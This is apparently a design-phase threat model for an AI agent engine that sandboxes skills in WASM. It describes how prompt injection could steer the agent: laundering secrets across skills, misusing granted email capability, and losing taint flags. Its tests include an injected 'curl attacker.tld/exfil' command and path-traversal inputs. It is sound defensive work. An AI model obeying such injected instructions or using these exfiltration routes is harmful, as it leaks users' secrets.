# Pythia — Threat Model & Security Requirements (design phase)

**Scope:** the approved design in `docs/superpowers/specs/2026-07-10-pythia-engine-design.md`.
**Weakness map:** `docs/reference/hermes-security-architecture.md` — every gap Hermes accepts as
residual is the thing Pythia's design claims to close *by construction*. This document tests that
claim before a line of code exists.
**Author role:** Security Architect — adversarial design review + STRIDE threat model.
**Status:** design-phase input to the implementation/build plan. No code reviewed (none exists).

> **Reading convention.** Findings are tagged **[HOLDS]** — the design as specified defends this —
> or **[GAP]** — the design does not yet specify a defense, or specifies one that can be
> circumvented. Every **[GAP]** maps to a numbered requirement in §5.

---

## 0. Executive summary

Pythia's thesis — *WASM has no ambient authority, so capability-based isolation is by-construction,
not bolted on* — is the correct structural answer to Hermes' headline admission ("the only security
boundary against an adversarial LLM is the operating system"). The design **does** eliminate the
class of failure that dominates the Hermes review: a skill with no `net` import cannot open a
socket, full stop, because the host function literally is not linked. That is a real, load-bearing
improvement, not a heuristic.

But "capability-based by construction" is a claim about **one boundary** (ambient authority), and
the Hermes review's own §3–§8 show that Hermes' worst failures are not really about ambient
authority — they are about **trust propagation through a single LLM-mediated context**: untrusted
content becomes instructions, one component's authority gets laundered through another
(confused deputy), and persistence turns a single injection into a standing backdoor. Pythia's
four-unit design inherits every one of those shapes unless each is independently closed:

1. The **event log** is architecturally identical to Hermes' `state.db` (plaintext SQLite,
   agent-writable, feeds every future LLM call) — it will reproduce Hermes' "memory as secret sink"
   and "logs are agent-writable" findings unless secret-handling and taint-propagation are specified
   now, not discovered later.
2. **Capability presence is not the same guarantee as capability-argument safety.** A skill that
   legitimately holds `net:smtp` and is tricked by injected content into emailing the attacker
   instead of the intended recipient is not a WASM sandbox failure — the sandbox worked exactly as
   designed. The design's safety-demo framing (§6 of the spec: "skill has no net capability →
   cannot execute") proves the easy case. It does not yet address the hard case.
3. **The by-construction claim is only as strong as the host-function implementations and the WASI
   import model.** Path traversal, symlink TOCTOU, blanket WASI preopens, and marshaling bugs at the
   wasm↔host FFI boundary can all reintroduce ambient authority through the back door of a correctly
   wired but naively implemented capability host.
4. **Manifest = request, policy = authority** is the right shape, but the design does not yet say
   what happens on a capability the policy file is silent about. If the default is fail-open, the
   entire model collapses to Hermes' problem one layer up (policy misconfiguration = ambient
   authority) instead of solving it.

None of this invalidates the thesis. It sharpens it: **Pythia should claim exactly what
capability-based isolation buys — prevention of ambient/ungranted authority — and build a second,
explicit layer (argument-level policy, taint propagation, log integrity) for the residual risks
that capability presence alone does not solve.** That second layer is what §5 specifies.

---

## 1. Trust boundaries & data-flow (Pythia's four units + provider + CLI)

```mermaid
flowchart TB
    subgraph EXT["UNTRUSTED"]
        USR["Local operator<br/>(CLI input)"]
        WEB["Tool-fetched / inbound content<br/>(file contents, future web/message<br/>content — anything a skill reads)"]
    end

    subgraph CLI_B["B1 — CLI channel"]
        CLI["CLI process<br/>single local input surface"]
    end

    subgraph KZ["KERNEL TRUST ZONE — orchestration only, no ambient exec authority"]
        LOOP["Kernel loop<br/>event-sourced"]
        CTX["Context compaction<br/>log slice -> provider payload<br/>(the cost lever AND an egress<br/>control point)"]
    end

    subgraph PB["B2/B3 — Provider seam"]
        PROV["Provider trait impl<br/>Ollama now / hosted later"]
    end

    subgraph LZ["B4 — Event log (durability + taint substrate)"]
        DB[("SQLite WAL<br/>append-only event table<br/>tainted flag per row")]
    end

    subgraph MP["B5 — Manifest + Policy grant flow"]
        MAN["Skill manifest<br/>capability REQUEST<br/>(untrusted input: author-controlled,<br/>later agent-authored)"]
        POL["Kernel policy file<br/>capability AUTHORITY<br/>grant / deny / prompt"]
    end

    subgraph HZ["B6/B7 — Capability Host (the real enforcement point)"]
        LINK["Import linker<br/>links ONLY approved imports"]
        HFN["Host functions: fs / net / secret<br/>MUST re-check exact scope on<br/>every call, not just at link time"]
    end

    subgraph SB["B8 — wasmtime sandbox: NO ambient authority"]
        SKILL["Skill (WASM)<br/>sees only its granted imports"]
    end

    USR --> CLI
    CLI -->|"UserCommand event<br/>(E1 — untrusted crosses in here)"| LOOP
    LOOP -->|"append every event"| DB
    LOOP -->|"compacted context"| CTX
    CTX -->|"prompt — MAY carry tainted /<br/>secret-derived data if not filtered"| PROV
    PROV -->|"LlmResponse: tool_call<br/>UNTRUSTED REQUEST, not a command"| LOOP

    LOOP -->|"dispatch tool_call"| LINK
    MAN -->|"capability request"| LINK
    POL -->|"grant/deny/prompt decision"| LINK
    LINK -->|"instantiate — only approved<br/>host fns present as imports"| SKILL
    SKILL -->|"call linked host fn"| HFN
    HFN -->|"effect result<br/>(tainted if source was tainted)"| LOOP
    WEB -.->|"tainted=1 at ingestion"| DB
    LOOP -->|"ToolResult event"| DB
    DB -->|"replay on crash-restart —<br/>facts, never re-executed"| LOOP
```

**Where untrusted data crosses into privileged execution — the four points that matter most:**

| Crossing | From (untrusted) | Into (privileged) | Governing control |
|---|---|---|---|
| CLI → Kernel | Local operator input | Event-sourced orchestration | None needed today (single local user); becomes a real boundary the moment any non-local channel is added |
| Provider → Kernel | LLM response (tool-call *request*) | Kernel dispatch | Manifest+policy grant flow — the request cannot become authority on its own |
| Tool result → Log → Provider | Tainted content read by a granted capability | Next LLM context (and therefore the *next* tool-call request) | Taint flag + context-compaction filtering — **the design names this control but does not yet specify its propagation rule** |
| Manifest → Host linker | Skill-author-declared capability wishlist | Actual WASM imports | Kernel policy — **the design does not yet specify the default for an unlisted capability** |

---

## 2. STRIDE by boundary

### 2.1 Capability Host (B6/B7) — does "by construction" actually hold?

| STRIDE | Threat | Design as specified | Verdict |
|---|---|---|---|
| Spoofing | Skill A's import calls are attributed to Skill B (namespace collision) if the host reuses a shared import/linker object across concurrently instantiated skills | Not specified — one `wasmtime` `Linker` per skill instance is assumed but not stated | **[GAP]** → SR-3, SR-7 |
| Tampering | Skill passes a malicious offset/length to a host function to read/write outside its intended linear-memory region (classic wasm↔host FFI marshaling bug class) | Not specified | **[GAP]** → SR-13 |
| Repudiation | No per-call record of *which* granted capability was invoked with *what* arguments, only the eventual `ToolResult` | Event log records tool results; grant *decisions* aren't a first-class event | **[GAP]** → SR-12 |
| Info disclosure | A `secret:*` capability's return value flows into a `ToolResult`, which is plain context on the next turn — a skill with `net` but no `secret` grant, or the LLM itself, can relay it out without either individual skill ever exceeding its own grant | Design states secrets are one capability class among fs/net; no distinct handling specified | **[GAP, high severity]** → SR-5 |
| DoS | A capability-holding or capability-free skill loops forever or allocates unbounded memory | Not specified — no fuel/epoch/memory-limit mention | **[GAP]** → SR-6 |
| Elevation | Import-time absence blocks *ungranted* capabilities (this holds). Per-call scope narrower than the import (`fs:read:/notes` vs. arbitrary path once `fs:read` is linked at all) is not addressed | Manifest declares scoped strings (`fs:read:/notes`); enforcement granularity not specified | **[HOLDS]** for import-absence; **[GAP]** for scope-narrowing → SR-3 |

### 2.2 Event log (B4) — can an injected agent tamper with its own replay log or taint flags?

| STRIDE | Threat | Design as specified | Verdict |
|---|---|---|---|
| Spoofing | A forged event (wrong type/turn_id) makes replay treat a dangerous call as an already-completed fact with attacker-chosen `effect_result` | Only the kernel appends, in-process — sound *if* the append path is the sole writer and nothing else (skill, provider callback) can write directly | **[HOLDS]** as stated, contingent on SR-12's audit discipline; state explicitly as an invariant → SR-12 |
| Tampering | `tainted` flag is cleared/lost when content is summarized or compacted into a derived event (§8 open question: compaction algorithm undefined) | Taint is set at ingestion; propagation through compaction/derivation is an **explicit open question in the spec**, not yet answered | **[GAP, structural]** → SR-8 |
| Repudiation | Policy grant/deny/prompt decisions aren't their own event type — post-incident review can't distinguish "host denied X" from "host was never asked" | Not specified | **[GAP]** → SR-12 |
| Info disclosure | Secret-capability results persist in plaintext SQLite forever, replayed on every restart, fed into every future compacted context — this is Hermes §7.1/§7.2's exact failure shape, inherited by architectural similarity (SQLite table Hermes itself validated the pattern from) | Not specified | **[GAP, high severity — direct Hermes parallel]** → SR-5 |
| DoS | Unbounded log growth from repeated large tainted tool outputs; WAL file growth without checkpoint | Not specified | **[GAP, low severity for slice]** → deferred, note only |
| Elevation | Direct file-level edit of the SQLite DB (OS-level write access) between kernel runs — no row integrity/signing — is the *file-tampering* analogue of Hermes' "logs are agent-writable, no append-only guarantee" (B1-R) | Not specified; SQLite/WAL gives atomicity, not tamper-evidence | **[GAP, lower likelihood for single-local-operator slice, but must be named, not silently assumed away]** → SR-15 (P2) |

### 2.3 Provider seam (B2/B3)

| STRIDE | Threat | Design as specified | Verdict |
|---|---|---|---|
| Spoofing | A malicious/compromised provider endpoint (or, later, a spoofed `base_url`) is functionally equivalent to a fully injected LLM at all times — no indirect content injection needed | `Provider` trait output is already treated as an untrusted *request*, never a command, per the design's "key invariant" — the same manifest+policy gate mediates regardless of what corrupted the provider output | **[HOLDS]** — this is the design's strongest structural feature: it doesn't matter *why* the LLM output is adversarial, the gate is the same |
| Tampering | MITM on non-loopback future providers (hosted APIs) | Ollama-local for the slice (loopback); future providers not yet specified for TLS/pinning | **[GAP, deferred]** — note for when hosted providers land |
| Info disclosure | The compacted context sent to the provider on every call can include prior tool results — including anything fetched via a `secret:` capability — before any hosted (non-local) provider is added, this is low-severity (stays on localhost), but the *design decision* about what belongs in the compacted slice is framed in §4 purely as a **cost lever**, not also as an **egress control point** | Not specified as a security control | **[GAP]** → SR-5, SR-11 |
| DoS | Hung/unavailable provider blocks a turn indefinitely | Not specified | **[GAP, availability-only]** — note for build plan, not P0 |
| Elevation | n/a beyond spoofing above | — | — |

### 2.4 CLI channel (B1)

| STRIDE | Threat | Design as specified | Verdict |
|---|---|---|---|
| Spoofing | Local multi-user OS box: another local user impersonates the operator | Out of scope per design (single local operator, no messaging gateway) | **[HOLDS as an explicit assumption]** — but the assumption itself must be written down, not implied, so it doesn't silently expand scope later → SR-17 |
| Tampering | n/a — OS-level, out of Pythia's control at this boundary | — | — |
| Repudiation | CLI input is logged verbatim as `UserCommand` (E1) | Confirmed in the design's event schema | **[HOLDS]** |
| Info disclosure | Secret-capability tool output echoed to terminal stdout / shell scrollback / tmux history | Not specified | **[GAP]** → SR-5 (extend to CLI rendering) |
| Elevation | A CLI flag or argument that bypasses the manifest+policy flow (a `--grant` style escape hatch) | Not specified either way | **[GAP — must be closed by omission, i.e., explicitly state the CLI has zero grant authority]** → SR-16 |

### 2.5 Manifest + Policy grant flow (B5) — can a malicious manifest over-request and get auto-granted?

| STRIDE | Threat | Design as specified | Verdict |
|---|---|---|---|
| Spoofing | Policy grants keyed by skill *name* rather than content hash — a differently-behaving module reuses a trusted name and inherits its approved grants | Design says "manifest declares," "policy decides" — binding mechanism (name vs. hash) unspecified | **[GAP]** → SR-7 |
| Tampering | Manifest edited after policy review approved an earlier version (manifest/binary drift, TOCTOU between "reviewed" and "runs") | Not specified | **[GAP]** → SR-7 |
| Repudiation | Which specific capability strings were approved, for which skill hash, isn't a queryable record | Not specified | **[GAP]** → SR-12 |
| Info disclosure | n/a directly | — | — |
| DoS | Manifest requests unbounded scope (`fs:read:/`) and policy mechanically relays it rather than rejecting/downscoping | Not specified | **[GAP]** — fold into SR-1 (deny-by-default, no wildcards) |
| Elevation | **The central question.** (a) Default for an unlisted capability — fail-open vs. fail-closed — unspecified. (b) `prompt` mode's approval could, in a future automation-happy config, be satisfied by another LLM call or a default-allow timeout, reproducing Hermes' `smart`-mode/`--yolo` failure at the policy layer. (c) Self-authored manifests (deferred milestone) auto-promoting without human review of source+manifest reproduces Hermes' skill-backdoor triad exactly | Two-part model (manifest=request, policy=authority) is directionally right; the *default* and the *prompt-mode semantics* are the two load-bearing details left unspecified | **[GAP, highest severity]** → SR-1, SR-10, SR-14 |

---

## 3. Adversarially poking the thesis — how prompt injection could still escape despite WASM

Each row: the escape route, whether the design *as specified* defends it, and the requirement that closes the gap.

| # | Escape route | Defended as specified? | Closing requirement |
|---|---|---|---|
| 1 | **Capability over-grant via policy default.** If an unlisted/misconfigured capability defaults to allow, the model collapses to "policy misconfiguration = ambient authority," one layer above where Hermes' OS boundary sat. | No — default unspecified | SR-1 |
| 2 | **Confused deputy via LLM-laundered composition across skills/turns.** Skill A (`secret` cap, no `net`) returns a secret in its `ToolResult`; that result becomes context; the LLM issues a second call to Skill B (`net` cap, no `secret`) with the secret embedded in the arguments. Neither skill individually exceeded its grant — the untrusted LLM is the connective tissue that launders authority across two individually-correct capability boundaries. This is the single most important gap: it is invisible to any test that checks only "does skill X have capability Y." | No — not addressed by presence/absence capability checks alone | SR-5, SR-8, SR-9 |
| 3 | **Confused deputy via misuse of a *legitimately held* capability.** A skill with real `net:smtp` is injected into sending to the attacker's address instead of the intended recipient. Capability-based security stops *ambient* authority; it does not stop *misuse of granted* authority through manipulated arguments. This is a fundamental, honest limit of the thesis, not a bug — the design's safety-demo (no-net-cap-skill-cannot-execute) proves the easy case and must not be mistaken for proving this harder one. | No — out of scope for import-presence checks by definition | SR-9 |
| 4 | **Taint not propagating through the log / future compaction.** If a compacted context summary drops the `tainted` bit carried by its source events, a later policy gate that should have blocked on taint sees clean data. The design's own §8 open question ("exact compacted-context algorithm... deferred") is exactly where this gap lives — it must be answered before compaction ships, not discovered after. | No — explicitly an open question in the spec | SR-8 |
| 5 | **Host-function implementation bugs.** Path traversal (`fs:read:/notes` + `../../etc/passwd`), symlink TOCTOU (check a path, then a symlink swap before the actual open), integer-overflow in wasm-supplied length/offset marshaling. The capability host's Rust code is now the security boundary Hermes said doesn't exist for their system — it must be held to a commensurate standard, not treated as ordinary application glue. | No — not specified | SR-3, SR-13 |
| 6 | **WASI ambient FS/env access.** WASI preview1's authority model is "whatever is preopened." If the host preopens a directory broader than the manifest scope for convenience, or passes through environment variables / clocks / random by default, ambient authority sneaks back in through the WASI standard-library default rather than a custom host function — precisely the failure the thesis claims cannot happen. This is the design's own §8 open question (preview1 vs. preview2/component model). | No — explicitly an open question in the spec | SR-4 |
| 7 | **Resource exhaustion.** A capability-free skill (passes every safety check) can still loop forever or exhaust memory inside wasmtime, hanging the kernel's single-threaded loop — not an exfil vector, but it directly undermines "the agent engine you can afford to leave running," which is 1/3 of the thesis (durable), not a side concern. | No — no fuel/epoch/memory-limit mention | SR-6 |
| 8 | **Provider-seam laundering.** A malicious/compromised provider endpoint is equivalent to a fully injected LLM without any content injection at all. | **Yes** — the "untrusted request, not a command" invariant already covers this; the same manifest+policy gate applies regardless of what corrupted the LLM output. This is the design's strongest point. | (strength — no new requirement; note the outbound-context half separately, SR-11) |
| 9 | **Manifest/policy TOCTOU + name-based trust.** A malicious module reuses a trusted skill's name to inherit its grants; a manifest is edited after the policy review that approved an earlier version. | No — binding mechanism unspecified | SR-7 |
| 10 | **`prompt`-mode auto-approval drift.** Nothing in the design *prevents* a future config where `prompt` resolves via another LLM call or a default-timeout-allow — reproducing Hermes' `smart`/`--yolo` failure at the policy layer. Naming this now, while the policy semantics are still greenfield, is cheap; discovering it after an "auto-approve for convenience" flag ships is not. | Not addressed either way | SR-10 |
| 11 | **Log file tampering (OS-level).** SQLite has no built-in row integrity; an attacker (or future non-local channel) with filesystem write access could edit `effect_result`/`tainted` columns directly, and replay would treat the edited row as ground truth. For a single local operator this is a lower-likelihood variant of "attacker already has host access" — but it should be named, not silently assumed away, exactly because Hermes' review flagged the identical shape (B1-R: "logs are agent-writable, no append-only guarantee"). | No — not addressed; acceptable to defer given current likelihood, but must be recorded | SR-15 (P2) |

---

## 4. What genuinely holds (credit where due)

- **Import-absence as denial is a real, structural guarantee**, not a heuristic — this is categorically
  stronger than Hermes' "approval gate that can be judged low-risk by an auxiliary LLM." A skill with
  no `net` import cannot open a socket no matter how it is manipulated; there is no code path to
  bypass, because there is no code.
- **"LLM output is a request, never a command" as a universal invariant** (§2.4 of the design) is
  applied uniformly regardless of *why* the output is adversarial (injected content vs. a
  compromised provider). This single invariant closes an entire class of Hermes findings (§3.3's
  "smart-mode auto-approves a diagnostic-framed exfil command") by construction, because there is no
  LLM-adjacent approval step to fool in the first place — approval is the policy file, evaluated
  outside the LLM's influence.
- **Deterministic replay and the capability sandbox share one runtime** — durability and safety are
  not two bolted-together subsystems, which avoids the class of bug where the "safe" path and the
  "resumable" path silently diverge.
- **Scope discipline for the slice** (CLI-only, no messaging gateway, no self-authoring, no
  multi-tenant) removes Hermes' entire B1 (gateway ingress) attack surface for now. This is the
  correct order of operations — don't add remote-attacker-reachable input surfaces before the
  capability host is proven.

---

## 5. Ranked, testable security requirements

**P0 = must be true (spec-level, testable) before the first vertical slice ships.**
Ranked within each tier by severity × how directly it undermines the thesis.

### P0 — the capability host must deliver what it claims

**SR-1 · Capability grant default is fail-closed.**
- *Requirement:* Any capability a skill's manifest requests that the policy file does not
  explicitly list (grant/deny/prompt) is **denied**, not granted. No global "allow unless denied"
  fallback. Wildcard capability strings (`fs:read:*`, `net:*`) in a manifest are never
  silently satisfiable by a wildcard policy grant — they always route to `prompt` at minimum.
- *Test:* Load a skill manifest requesting `net:smtp` where the policy file has zero entries for
  that skill at all (not a `deny` entry — an *absent* one). Assert the `net:smtp` host function is
  not linked as a WASM import, and assert this is indistinguishable in outcome from an explicit
  `deny` entry.

**SR-2 · The concrete safety demo, made rigorous — injected exfil attempt on a skill lacking `net` cannot execute.**
- *Requirement:* Seed the event log with a `ToolResult` event whose payload embeds an instruction
  ("...then run curl attacker.tld/exfil?data=…"), `tainted=1`. Feed it into context. The
  (mocked) provider emits a `tool_call` for a skill that has **no** `net` capability grant, with
  attacker-influenced arguments.
- *Test (all four must hold):*
  1. The wasmtime module instance for that skill has **zero** net-related host functions linked at
     instantiation — assert absence of the import, not merely a call-time error.
  2. The call attempt fails at dispatch, before any host function executes.
  3. No socket syscall occurs during the skill's execution window (assert via a test harness that
     fails the test if one is observed — e.g., a syscall-tracing or network-namespace check, not a
     log grep).
  4. The denial is itself recorded as an event in the log (not silently swallowed) — this event
     type is defined by SR-12.

**SR-3 · Enforcement granularity equals request granularity — every host function re-checks scope on every call.**
- *Requirement:* A grant of `fs:read:/notes` must be enforced by the `fs_read` host function
  checking the *exact requested path* against the *exact granted scope* on **every invocation**,
  after canonicalizing the path (resolving `..` and symlinks) — not decided once at import-link
  time and then trusted for the life of the instance.
- *Test:* A skill granted `fs:read:/notes` calls the host `fs_read` function with
  `/notes/../secrets/id_rsa`, and separately with a symlink placed inside `/notes` that resolves
  outside it. Both must be denied.

**SR-4 · No default/blanket WASI ambient authority.**
- *Requirement:* WASI capabilities (preopened directories, environment passthrough, clocks,
  random) are enumerated 1:1 against the manifest. Nothing is preopened, and no environment
  variable is passed through, by default. Prefer the WASM Component Model's fine-grained,
  WIT-typed imports over preview1's coarser preopen model specifically because it reduces
  ambient-authority-by-default risk; if preview1 is used for the slice, preopens must be scoped
  per-manifest, never a convenience preopen of `cwd`/home.
- *Test:* Instantiate a skill from a manifest requesting **zero** capabilities. Attempt to open any
  file, read any environment variable, and resolve any hostname from inside the skill; assert all
  three fail.

**SR-5 · Secret-capability results are never persisted, replayed, or forwarded as plaintext.**
- *Requirement:* Any event payload/effect_result produced via a `secret:*` capability call is
  redacted or replaced with an opaque handle before it is written to the event log, before it is
  included in the context slice sent to any `Provider`, and before it is rendered to CLI stdout.
  This must be true by construction (the code path that constructs log rows / provider payloads /
  CLI output never has the plaintext value in scope after the host function returns it to the
  skill), not by best-effort redaction after the fact.
- *Test:* A skill fetches a value via `secret:SMTP_PASSWORD`. Grep the SQLite event log file, the
  outbound `Provider` request body on the next turn, and CLI stdout for the literal secret value —
  all three must show zero hits.

**SR-6 · Every skill instantiation has an explicit resource limit.**
- *Requirement:* Every wasmtime instantiation sets a fuel or epoch-interruption limit and a linear
  memory ceiling. Exceeding either force-terminates the instance; the kernel loop is never blocked
  indefinitely by a single skill call. Termination is recorded as an event (`ResourceLimitExceeded`
  or equivalent).
- *Test:* Instantiate a skill compiled to loop forever (and, separately, one that allocates
  unbounded memory). Assert force-termination within the configured bound, the kernel proceeds
  (does not hang), and the termination is present in the event log.

### P1 — defense-in-depth for the residual risk capability-presence alone does not solve

**SR-7 · Manifest+policy grants are bound to a content hash, not a mutable name.**
- *Requirement:* Policy entries key on a hash of the wasm module and its manifest together. A
  differently-behaving module (or an edited manifest) cannot inherit a previously-approved grant by
  reusing the same skill name.
- *Test:* Load two distinct wasm binaries under the same skill name with different manifests;
  assert each is evaluated for grants independently (no inheritance by name). Modify a
  previously-approved skill's manifest without re-running policy review; assert the grant is
  invalidated, not silently carried forward.

**SR-8 · Taint propagates through the full data-flow, including any future compaction/derivation, and is never silently lost.**
- *Requirement:* `tainted=1` on a source event must propagate to any subsequent event within the
  same turn (at minimum) whose content the LLM constructed using that tainted source — including
  through any future context-compaction/summarization step. A compacted/derived event inherits the
  taint of any tainted input it summarizes; there is no code path that constructs a new event from
  tainted inputs and defaults the new event's taint flag to `0`. This must be specified before the
  compaction algorithm (design §8 open question) is implemented, not after.
- *Test:* Given a `ToolResult{tainted:1}` followed by an `LlmResponse` whose tool-call arguments
  are derived from that result's content, assert the `LlmResponse` (or the `ToolResult` it
  produces) is also `tainted:1`. Given a hypothetical compacted-context event summarizing a window
  that includes a tainted row, assert the compacted event is `tainted:1`.

**SR-9 · Argument-level policy for high-consequence granted capabilities (send / delete / pay / exec).**
- *Requirement:* Capability grants for functions whose misuse is high-consequence support
  argument-level constraints beyond presence/absence — e.g., a recipient allowlist for `net:smtp`,
  a path allowlist/denylist for `fs:write`/`fs:delete`, or a mandatory human-confirm step when the
  call's arguments are derived from tainted input (per SR-8's propagated taint flag). This closes
  escape route #3 in §3: a skill misusing a capability it legitimately holds.
- *Test:* A skill holding `net:smtp` receives tainted, LLM-constructed arguments whose recipient is
  not on the configured allowlist (or, absent an allowlist, whose triggering context is tainted);
  assert the call is blocked/held for confirmation rather than executed silently.

**SR-10 · `prompt` policy mode blocks on a real human-attached channel, never resolvable by automation.**
- *Requirement:* A `prompt` grant decision synchronously blocks on the CLI's actual stdin (or
  equivalent human-attached channel). It is never satisfiable by another LLM call, an auxiliary
  "judge" model, or a default-timeout-resolves-to-allow. This forecloses Hermes' `smart`-mode /
  `--yolo` failure shape at the policy layer before any such convenience feature is proposed.
- *Test:* Trigger a `prompt`-mode capability request with no human input available (stdin closed /
  non-interactive session); assert the request denies (or hangs, never auto-allows) rather than
  resolving to grant.

**SR-11 · Context-compaction algorithm design must treat secret exclusion as a control, not an afterthought.**
- *Requirement:* When the compacted-context algorithm (design §8 open question) is specified, its
  spec must state explicitly that any event whose content originated from a `secret:*` capability
  call is excluded from the slice sent to any `Provider`, by construction — this is the same
  invariant as SR-5, restated as a requirement on the *algorithm's design*, not just the runtime
  behavior, so it cannot be reintroduced when compaction is implemented.
- *Test:* covered by SR-5's test once compaction exists; recorded here so the compaction design
  doc, when written, is reviewed against it.

**SR-12 · Every policy decision is a first-class, queryable event.**
- *Requirement:* Grant, deny, and prompt decisions — including which specific capability string,
  which skill (by hash), and the policy rule that matched — are recorded as their own event type in
  the log, distinct from `ToolResult`. This gives SR-2's safety demo and any post-incident review a
  direct audit trail, rather than one inferred from which imports happened to be linked.
- *Test:* After a capability request is denied, query the event log for a `PolicyDecision` event
  carrying the skill hash, capability string, and `deny` outcome.

**SR-13 · Capability host functions are treated as the security-critical core.**
- *Requirement:* Every host function that marshals wasm-supplied buffers, offsets, or lengths
  (fs/net/secret) is fuzz-tested against malformed/adversarial inputs; every fs-path-accepting host
  function canonicalizes and rejects symlink traversal by default; this code receives review
  commensurate with authentication/authorization code, because it *is* the security boundary the
  thesis rests on.
- *Test:* Fuzz harness exists per host function taking wasm-controlled byte ranges; CI runs it;
  a corpus of known-bad inputs (out-of-bounds offset, negative-as-unsigned length, symlink-in-path)
  is asserted to fail closed, not panic/UB.

### P2 — persistence, provenance, and future-milestone guardrails (name now, build when the milestone starts)

**SR-14 · Self-authored skill manifests never auto-promote without human review of source + manifest + hash-pin.**
- *Requirement (for the deferred self-authoring milestone, specified now so it isn't skipped
  later):* When an agent authors its own skill, the resulting manifest is quarantined — not
  grantable — until an operator reviews both the wasm source and the manifest together and the
  approved pair is hash-pinned per SR-7. This directly forecloses Hermes' §3.4 "self-authored skill
  as persistent backdoor" chain, which the self-authoring milestone would otherwise reproduce
  exactly.
- *Test (write when the milestone starts):* Agent authors a skill under simulated injection;
  assert it cannot be attached to any execution path until an explicit operator-approval event is
  recorded.

**SR-15 · Log tamper-evidence for any deployment beyond a single trusted local operator.**
- *Requirement:* Before any milestone that introduces a non-local input channel, multi-tenant use,
  or shared-host deployment, add row-level integrity to the event log (e.g., hash-chaining each row
  against the previous) so direct file-level edits to the SQLite DB are detectable on load. Not
  required for the single-local-operator slice, but must be named now so it is not silently
  inherited as a permanent gap the way Hermes' agent-writable logs were.
- *Test (write when the milestone starts):* Directly edit a row in the DB file between kernel
  runs; assert the kernel detects the integrity break on next load rather than replaying silently.

**SR-16 · The CLI has zero authority to alter policy or grants outside the reviewed policy-file mechanism.**
- *Requirement:* No CLI flag or argument grants, widens, or bypasses a capability at runtime. All
  grant authority flows through the policy file, which is the only mechanism intended to be
  reviewed as a security artifact.
- *Test:* Attempt to invoke the CLI with any flag that would expand a skill's granted capabilities
  beyond what the policy file specifies; assert no such flag exists / has any effect.

**SR-17 · The CLI's trust boundary ("local OS user") is a written, explicit assumption, not an implicit one.**
- *Requirement:* Document, in the architecture ADR, that the CLI channel's authentication model is
  "whoever has local OS access to invoke it" — deliberately, as a scope decision, not by omission —
  and that this assumption must be explicitly revisited (not silently inherited) the moment any
  non-local input channel (messaging gateway, remote CLI/RPC) is added. This is the same sentence
  that drew criticism in Hermes' review; the difference is Pythia scopes it to *who may issue a
  command*, not *what a granted skill may execute* — but that distinction must be stated, not
  assumed obvious.
- *Test:* n/a (documentation requirement) — verify presence in the architecture ADR at review time.

---

## 6. Residual-risk statement

Even with every P0–P2 requirement met, Pythia's own thesis draws a precise, honest boundary around
what capability-based isolation solves: **it prevents ambient/ungranted authority.** It does not,
by itself, prevent:

- a skill from misusing an authority it was legitimately and correctly granted (§3 #3 — this is
  why SR-9 exists as a second, explicit layer, not an assumption that capability presence implies
  argument safety);
- an untrusted LLM from laundering data between two individually-correct capability grants across
  turns (§3 #2 — why SR-5/SR-8 exist);
- a bug in the capability host's own Rust implementation from reintroducing ambient authority
  through a marshaling error or an over-broad WASI default (§3 #5, #6 — why SR-3/SR-4/SR-13 exist).

This is a materially smaller and more auditable residual surface than Hermes' "the OS is the only
boundary" — the attack now has to find a bug in a small, reviewed, fuzz-tested host-function core or
a misuse of an argument within an already-narrow grant, rather than any arbitrary shell command.
That is the honest version of the thesis, and it is the version that should be stated in the
architecture ADR and the eventual `SECURITY.md`: **Pythia does not claim prompt injection cannot
happen — it claims that when it happens, the blast radius is bounded by what was explicitly
granted, and the boundary is a small, auditable piece of Rust code instead of the entire operating
system.**
